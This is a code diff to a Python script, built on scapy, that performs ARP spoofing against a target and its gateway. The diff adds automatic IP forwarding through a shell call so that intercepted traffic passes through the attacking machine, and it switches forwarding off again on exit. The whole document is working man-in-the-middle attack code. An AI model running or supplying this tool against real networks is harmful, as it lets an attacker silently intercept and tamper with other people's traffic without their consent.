@@ -3,6 +3,7 @@
 import scapy.all as scapy
 import time
 import sys
+import subprocess
 
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
@@ -27,18 +28,18 @@ target_ip = ""
 gateway_ip = "" 
 
 try:
+    subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
     packets_sent_count = 0
     while True:
         spoof(target_ip, gateway_ip)
         spoof(gateway_ip, target_ip)
         packets_sent_count = packets_sent_count + 2
-        #TODO: forward the packets automatically
-        print("\r(0) Sent " + str(packets_sent_count)),
+        print("\r[+] Sent " + str(packets_sent_count)),
         sys.stdout.flush()
         time.sleep(2)
-        print("to forward the packets do: echo 1 > /proc/sys/net/ipv4/ip_forward")
 
 except KeyboardInterrupt:
     print("\n I see do you want to quit ... Resetting ARP tables, please wait...")
     restore(target_ip, gateway_ip)
     restore(gateway_ip, target_ip)
+    subprocess.call("echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True)
